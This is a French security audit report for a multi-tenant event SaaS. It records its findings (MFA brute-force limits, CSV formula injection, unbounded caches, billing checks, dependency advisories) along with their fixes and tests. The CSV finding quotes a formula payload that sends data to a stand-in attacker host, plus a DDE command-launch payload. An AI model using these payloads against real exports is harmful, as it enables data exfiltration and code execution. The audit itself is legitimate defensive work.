# Audit d’architecture et de sécurité — 2026-09-07

| Champ | Valeur |
|---|---|
| **Date** | 2026-09-07 |
| **Périmètre** | Dépôt complet (`server`, `client`, `packages/core`, migrations, CI) — analyse statique |
| **Référentiel** | OWASP ASVS 4.0.3 (V1 architecture, V2 authentification, V4 contrôle d’accès, V5 validation, V7 journalisation, V12 fichiers, V13 API) + NIST SSDF (PW.4, PW.7, RV.1) |
| **Base de comparaison** | [Audit du 2026-08-05](security-audit-2026-08-05.md) |
| **État initial des vérifications** | Toutes vertes avant intervention : `packages/core` 47/47, serveur 198/198, typecheck serveur et client OK. Aucun échec préexistant. |
| **Non vérifié** | Environnement de production (aucun accès), tests E2E Playwright (nécessitent une base migrée), configuration Railway, Redis, tableau de bord Stripe, DNS des domaines clients |

---

## 1. Ce qui a été examiné, et ce qui tient

L’isolation multi-locataire a été vérifiée **route par route**, pas par sondage : les 87 routes d’administration ont été extraites automatiquement et confrontées à leur garde d’accès.

- Les **70 routes portant `:eventId`** appellent toutes `getAccessibleEventOrThrow`. Aucune omission.
- Les **29 routes à ressource imbriquée** (`/:eventId/assets/:assetId`, `/:eventId/requests/:requestId`…) transmettent l’`eventId` jusqu’à la requête SQL ou au contrôle de service. Vérifié dans les 28 fonctions de dépôt/service correspondantes : toutes filtrent sur `event_id`, aucune ne se contente de l’UUID de la ressource. Pas d’IDOR de second niveau.
- **Aucune concaténation SQL** : toutes les requêtes sont paramétrées, y compris la recherche globale (jokers `ILIKE` échappés).
- Le rendu serveur de la SPA échappe systématiquement (`escapeHtml`, `<` dans les blocs JSON) ; le HTML riche est assaini à l’écriture **et** à la lecture.
- Les jetons d’accès (espace journaliste, espace production, réinitialisation) sont stockés hachés, à usage unique et rotés à l’échange.

Les faiblesses trouvées ne sont donc pas dans le contrôle d’accès applicatif, mais dans **l’anti-automation, la sortie de données et les bornes de ressources**.

---

## 2. Constats

| ID | Catégorie | Gravité | Preuve | Statut |
|---|---|---|---|---|
| SEC-01 | Anti-automation du second facteur (ASVS V2.2.1) | **Élevée** | `POST /api/admin/auth/login/mfa` n’était plafonné que par IP ; le challenge est un JWT sans état rejouable 5 min | **Corrigé dans le code + test de non-régression** |
| SEC-02 | Injection de formules CSV (CWE-1236) | **Moyenne** | Champs du formulaire d’accréditation **public** réinjectés bruts dans les 4 exports CSV | **Corrigé dans le code + test de non-régression** |
| SEC-03 | Épuisement de ressources (CWE-770) | **Moyenne** | Deux caches indexés sur une valeur choisie par l’appelant : chemin d’URL (métriques) et en-tête `Host` | **Corrigé dans le code + test de non-régression** |
| SEC-04 | Logique métier / facturation | **Faible** (défense en profondeur) | `materializeOrgPurchase` livrait crédits et options sans vérifier le tarif payé, contrairement au chemin d’inscription | **Corrigé dans le code + test de non-régression** |
| SEC-05 | Dépendance vulnérable | **Faible** dans cette configuration | `sanitize-html` 2.17.5 (GHSA-jxwj-j7wr-gfrw, GHSA-g8qq-57p8-ggw5) | **Corrigé (2.17.7) + propriété verrouillée par test** |
| ARC-01 | Contrat implicite / atomicité | Priorité moyenne | `tryConsumeEventCredit` et `addEventCredits` acceptaient le pool par défaut, ce qui annule silencieusement leur `FOR UPDATE` | **Corrigé dans le code (garanti à la compilation)** |
| OPS-01 | Chaîne d’approvisionnement / CI | Priorité moyenne | Workflow sans bloc `permissions`, sans contrôle de dépendances | **Corrigé dans le code** |
| RES-01 | Dépendance vulnérable sans correctif amont | Moyenne, **acceptée** | `qs` 6.15.3 via `express` 4.22.2 | **Identifié, non corrigé — voir §4** |
| RES-02 | Anti-automation des mots de passe | Faible, **acceptée** | Login (admin et journaliste) plafonné par IP+email | **Identifié, non corrigé — voir §4** |

---

### SEC-01 — Bruteforce du second facteur insensible à la rotation d’IP

**Fichiers** : `server/src/routes/admin/auth.ts`, `server/src/lib/rateLimitStore.ts`

**Chemin d’attaque.** Un attaquant qui possède déjà le mot de passe d’un administrateur (réutilisation, hameçonnage, fuite tierce) obtient un `challenge` MFA. Ce challenge est un JWT **sans état**, valable 5 minutes et rejouable autant de fois que voulu. Le seul plafond était `authRateLimitKey('mfa', req.ip, undefined)` — **10 tentatives par IP** par fenêtre de 15 min. Un pool d’adresses multiplie ce quota par le nombre d’IP, et un nouveau challenge s’obtient à volonté. Le code TOTP n’a que 10⁶ valeurs, dont 3 acceptées simultanément (tolérance ±1 fenêtre).

**Impact.** La MFA est **obligatoire** pour les rôles `admin` et super-administrateur plateforme (`mfaPolicy.ts`) : c’est exactement le contrôle censé survivre à la compromission d’un mot de passe. Son contournement donne l’accès complet à l’organisation, ou à la plateforme entière pour un super-administrateur.

**Correction.** Second limiteur indexé sur le **compte** porté par le challenge, dont la signature est vérifiée avant usage (un attaquant ne peut donc pas choisir sa clé de comptage) : 5 échecs / 15 min, quel que soit le nombre d’IP. `skipSuccessfulRequests` évite de pénaliser un utilisateur légitime. Repli sur l’IP si le challenge est absent ou forgé, pour rester borné.

**Pas d’effet de bord de déni de service** : obtenir un challenge signé pour un compte exige d’avoir déjà franchi son étape mot de passe. Un tiers ne peut donc pas verrouiller le second facteur d’un compte qu’il ne sait pas déjà déverrouiller.

**Validation** : `server/test/mfa-bruteforce.test.ts` — 3 tests. Vérifié en RED (3 échecs sans le limiteur) puis en GREEN.

### SEC-02 — Injection de formules dans les exports CSV

**Fichiers** : `server/src/lib/csv.ts` (source), consommé par les 4 exports de `eventExportService.ts`

**Chemin d’attaque.** `POST /api/public/events/:eventId/accreditations` est **non authentifié**. `firstName`, `lastName`, `media`, `phone` et le message des demandes sont du texte libre. `escapeCsvCell` appliquait le guillemetage RFC 4180 mais laissait passer les amorces `=`, `+`, `-`, `@`, tabulation et retour chariot. Le guillemetage **ne protège pas** : Excel, LibreOffice et Google Sheets retirent les guillemets avant d’évaluer le contenu.

**Impact.** Un prénom valant `=HYPERLINK("https://attaquant.test/?d="&A1;"Voir")` s’exécute quand l’organisateur ouvre l’export — exfiltration du fichier de contacts presse, ou DDE (`+cmd|'/c calc'!A1`) sur les configurations qui l’autorisent encore. La donnée en jeu est le cœur de valeur du produit.

**Correction.** Neutralisation à la source dans `escapeCsvCell` : préfixe apostrophe sur les amorces dangereuses, avec exception explicite pour les valeurs purement numériques — les téléphones internationaux (`+33 6 …`) et les nombres négatifs restent exploitables tels quels dans le tableur.

**Validation** : `server/test/csv.test.ts` — 4 tests ajoutés. Vérifié en RED (3 échecs) puis en GREEN.

### SEC-03 — Deux caches non bornés pilotés par l’appelant

**Fichiers** : `server/src/middleware/metrics.ts`, `server/src/services/siteService.ts`

1. **Séries de métriques.** `routeKey` retombait sur `req.path` quand aucune route ne correspondait. Chaque `POST /chemin-inexistant-N` créait donc une entrée **permanente** dans la `Map` des séries — et polluait `/api/metrics`.
2. **Résolution d’hôte.** `resolveEventForHost` mettait en cache une entrée par en-tête `Host`, y compris les résultats négatifs, sans plafond ni éviction. Cette fonction est appelée à **chaque rendu de la SPA** et à chaque `robots.txt` / `sitemap.xml` / `llms.txt`.

**Impact.** Croissance mémoire non bornée déclenchable par un attaquant non authentifié, jusqu’à l’OOM du conteneur — indisponibilité de toutes les surfaces, publiques comme back-office.

**Correction.** Les requêtes non routées sont agrégées sous une étiquette unique (`<non routé>`) au lieu de porter le chemin choisi par l’appelant, plus un plafond de 200 séries en garde-fou. Le cache d’hôtes est plafonné à 500 entrées, avec purge des entrées expirées puis remise à zéro si la pression persiste.

**Validation** : `server/test/resource-exhaustion.test.ts` — 3 tests. Vérifié en RED (2 échecs) puis en GREEN.

### SEC-04 — Livraison sans contrôle du tarif payé

**Fichier** : `server/src/services/billingService.ts`

Le chemin d’inscription (`materializeFromSession`) vérifiait déjà le Price ID contre la liste des tarifs configurés. Le chemin d’achat depuis un compte existant (`materializeOrgPurchase` : pack de 3, extra agence, Média Plus) accordait crédits et options sur la **seule foi des métadonnées** de la session.

La signature du webhook garantit l’authenticité de l’événement Stripe, **pas la cohérence** entre l’offre facturée et l’offre créditée. Une clé Stripe compromise, un Price ID modifié dans le Dashboard ou une régression du code d’achat livreraient la prestation sans l’encaissement correspondant. **Non exploitable en l’état par un tiers** — d’où la gravité faible — mais l’asymétrie entre les deux chemins est une règle métier incohérente, exactement le type d’écart qui devient une faille à la première évolution.

**Correction.** `paidAtExpectedPrice` compare le Price ID réellement facturé au tarif configuré **pour l’offre annoncée** — contrôle plus strict que la simple liste d’autorisation du chemin d’inscription. Best-effort assumé : si l’API Stripe est injoignable, on ne pénalise pas un achat légitime.

**Validation** : `server/test/billing-org-purchase.test.ts` — 2 tests. Vérifié en RED puis en GREEN.

### SEC-05 — `sanitize-html` 2.17.5 : alerte confirmée, exposition écartée

`npm audit` signalait deux avis de XSS stocké. **Les deux ont été rejoués contre l’allowlist réelle de ce projet, sur la version vulnérable 2.17.5** : les charges sont neutralisées, car GHSA-jxwj-j7wr-gfrw exige `textarea` autorisé et GHSA-g8qq-57p8-ggw5 exige `svg`, or `sanitizeRichHtml` n’autorise ni l’un ni l’autre.

La montée en 2.17.7 est donc une **précaution**, pas la fermeture d’une faille exploitable. Ce qui protège réellement la newsroom publique, c’est l’allowlist — trois tests la verrouillent désormais (`sanitizeRichHtml.test.ts`), y compris les charges des deux avis.

### ARC-01 — Atomicité des crédits garantie par le typage

**Fichiers** : `server/src/db/repositories/orgBillingRepo.ts`, `server/src/db/types.ts`

`tryConsumeEventCredit` protège la consommation d’un crédit par `SELECT … FOR UPDATE`. Ce verrou ne sérialise les créations concurrentes **que s’il tient jusqu’au COMMIT**. Or la signature acceptait `db: Queryable = pool` : appelée sans transaction, la fonction relâchait le verrou à la fin de l’instruction et deux créations simultanées consommaient le même crédit — un événement gratuit par course gagnée.

Les deux appelants actuels passent bien un client de transaction : **ce n’est pas un défaut exploitable aujourd’hui**, c’est un contrat implicite qui ne survit pas à la prochaine évolution. Le type `TransactionClient` rend désormais l’oubli impossible à la compilation, sur les deux fonctions concernées.

**Validation** : `npm --workspace server run typecheck` — vérifie que tous les appelants passent un client de transaction. Limite : garantie statique, pas de test de concurrence réel (nécessiterait une base de test dédiée).

### OPS-01 — Durcissement CI

`.github/workflows/ci.yml` ne déclarait aucun bloc `permissions` : le `GITHUB_TOKEN` héritait des permissions par défaut de l’organisation, potentiellement en écriture. Un script de dépendance compromis pouvait donc pousser du code (NIST SSDF PW.4). Ajout de `permissions: contents: read`.

Aucun contrôle de dépendances n’existait — c’est ce qui a laissé passer SEC-05. Ajout de `npm audit --omit=dev --audit-level=high` (bloquant) et d’un audit complet informatif.

---

## 3. Vérifications exécutées

| Commande | Avant | Après |
|---|---|---|
| `npm --workspace packages/core run test` | 47/47 | 47/47 |
| `npm --workspace server run test` | 198/198 | **210/210** (12 tests de non-régression ajoutés) |
| `npm --workspace server run typecheck` | OK | OK |
| `npm --workspace client run typecheck` | OK | OK |
| `npm --workspace client run build` | OK | OK |
| `npm audit --omit=dev --audit-level=high` | **échec** (2 « high ») | **succès** |

Chaque correctif de sécurité a été validé en **RED puis GREEN** : le test échoue quand on retire le correctif, il passe quand on le remet.

**Non exécuté au moment de la rédaction initiale** : tests E2E Playwright (base migrée requise).

### Mise à jour du 2026-09-07 après déploiement

| Étape | Résultat |
|---|---|
| Push `main` (27de1f7) | CI GitHub Actions **verte**, E2E Playwright inclus ([run 34095651051](https://github.com/DenisAIagent/pr-event-360/actions/runs/34095651051)) |
| Déploiement Railway | `1f4e5828` **SUCCESS**, déployé depuis un worktree propre sur 27de1f7 |
| Santé production | `GET /api/health` → 200 `{"status":"ok"}` |
| Non-régression d’actif | `/media/pr-event-360-demo.mp4` → 200, 5 393 784 octets (inchangé) |
| **SEC-01 vérifié en production** | En-tête `RateLimit-Limit: 5` observé sur `/api/admin/auth/login/mfa` — c’est le plafond par compte. L’ancien code aurait renvoyé `10`. |

**Le service Railway n’est pas relié au dépôt GitHub** (`source: {repo: null}`) : un push sur `main` déclenche la CI mais **ne déploie pas**. Les déploiements se font par `railway up`, qui téléverse le répertoire de travail — d’où le passage par un worktree propre pour ne pas embarquer de fichiers non commités.

SEC-02, SEC-03, SEC-04, SEC-05 et ARC-01 sont **déployés** et couverts par les tests exécutés en CI, mais n’ont pas fait l’objet d’une vérification active distincte en production : leur observation exige soit un accès authentifié, soit des sondes destructives (déclenchement volontaire d’un épuisement mémoire, écriture d’un export). Leur statut est donc « déployé », pas « vérifié dans l’environnement cible ».

---

## 4. Points restants, par ordre de traitement

### RES-01 — `qs` 6.15.3 via `express` 4.22.2 (moyenne, acceptée)

GHSA-4mjr-xmp4-gh2g et GHSA-x5fp-wj9c-mxmx (déni de service et contournement de `arrayLimit`). **Aucun correctif amont** : 4.22.2 est la dernière version de la ligne Express 4 et embarque encore `qs` 6.15.3. Forcer un `override` vers `qs` 6.16.0 sous Express reviendrait à livrer une combinaison que ni npm ni Express n’ont validée — c’est précisément le type de mise à jour forcée non analysée qu’il faut éviter.

Exposition réelle limitée : seul l’analyseur de query string emprunte ce chemin (`express.urlencoded` n’est pas monté, seul `express.json` l’est), et les valeurs de query sont toutes des chaînes plates validées par Zod. Le seuil `--audit-level=high` de la CI laisse donc passer cet avis « moderate » tout en le gardant visible dans l’étape d’audit informative.

**Prochaine action** : suivre la ligne Express 4 ; réévaluer à la publication d’une 4.22.3, ou lors d’un passage à Express 5.

### RES-02 — Bruteforce distribué sur les mots de passe (faible, acceptée)

Le login administrateur (`IP + email`) et le login journaliste (IP) restent contournables par rotation d’adresses. **Choix délibéré, contrairement à SEC-01** : un plafond par compte seul permettrait à n’importe quel tiers de verrouiller un compte connu, alors qu’un challenge MFA exige déjà de connaître le mot de passe. Le facteur de travail est par ailleurs sans commune mesure — Argon2 face à un secret de 6 chiffres.

**Prochaine action** si le risque évolue : verrouillage progressif par compte avec notification par email, plutôt qu’un plafond sec.

### OPS-02 — Redis absent en production, plafonds multipliés par le nombre de répliques (**confirmé en production**)

Point hérité de l’audit précédent, **désormais vérifié dans l’environnement cible** (2026-09-07, après déploiement) :

- `REDIS_URL` **n’est pas défini** dans les variables Railway de production (`REQUIRE_REDIS` non plus) ;
- le service tourne sur **plusieurs répliques** (≈ 3, estimé) : des requêtes successives depuis une même IP sur `/api/admin/auth/login/mfa` alternent 401 et 429 avec des `RateLimit-Remaining` divergents — chaque réplique compte dans son propre `MemoryStore`.

**Conséquence.** Toute limite de débit vaut en réalité `limite × nombre de répliques`. Le plafond SEC-01 de 5 échecs / 15 min par compte en vaut donc ≈ 15, et l’anti-bruteforce du login ≈ 30. La correction SEC-01 **reste un gain net** — l’attaque par rotation d’IP est fermée, le plafond ne dépend plus du nombre d’adresses de l’attaquant — mais son niveau effectif est dégradé tant que les compteurs ne sont pas partagés.

**Prochaine action, prioritaire.** Provisionner un Redis Railway, définir `REDIS_URL`, puis `REQUIRE_REDIS=true` (refuse le démarrage sans Redis, évite une régression silencieuse). Vérification d’acceptation : la 6ᵉ tentative sur `/api/admin/auth/login/mfa` depuis une même IP doit renvoyer 429 de façon **déterministe**, et non une répartition 401/429.

### OPS-03 — Chaîne de déploiement non automatisée

Le déploiement dépend d’un `railway up` lancé depuis un poste, à partir d’un répertoire de travail qui peut différer de `main` — ici, la suppression locale non commitée de la vidéo de démonstration aurait retiré de la production un fichier de 5,4 Mo qu’elle sert réellement. C’est une source de dérive entre le code audité, le code testé par la CI et le code exécuté.

**Prochaine action** : relier le service Railway au dépôt GitHub (Settings → Source) pour que la production soit toujours le reflet d’un commit passé par la CI.

---

## 5. Conclusion, bornée aux preuves obtenues

Le contrôle d’accès multi-locataire a été vérifié exhaustivement sur les 87 routes d’administration et leurs 28 fonctions de dépôt : **aucun défaut trouvé**. Les faiblesses corrigées portent sur l’anti-automation, la sortie de données et les bornes de ressources — des angles que la revue précédente n’avait pas couverts.

Cette conclusion ne vaut que pour le **périmètre examiné**. Une seule correction (SEC-01) a été vérifiée activement en production ; Stripe, le DNS des domaines clients et le comportement des surfaces authentifiées en production n’ont pas été testés. La vérification post-déploiement a par ailleurs mis au jour une faiblesse d’exploitation que l’analyse statique seule n’aurait pas confirmée (OPS-02, Redis absent en multi-réplique) — rappel utile que le code corrigé et le contrôle effectif en production sont deux choses distinctes.

Cet audit n’établit pas l’absence de faille, seulement l’absence de faille **détectée par les vérifications décrites ici**.
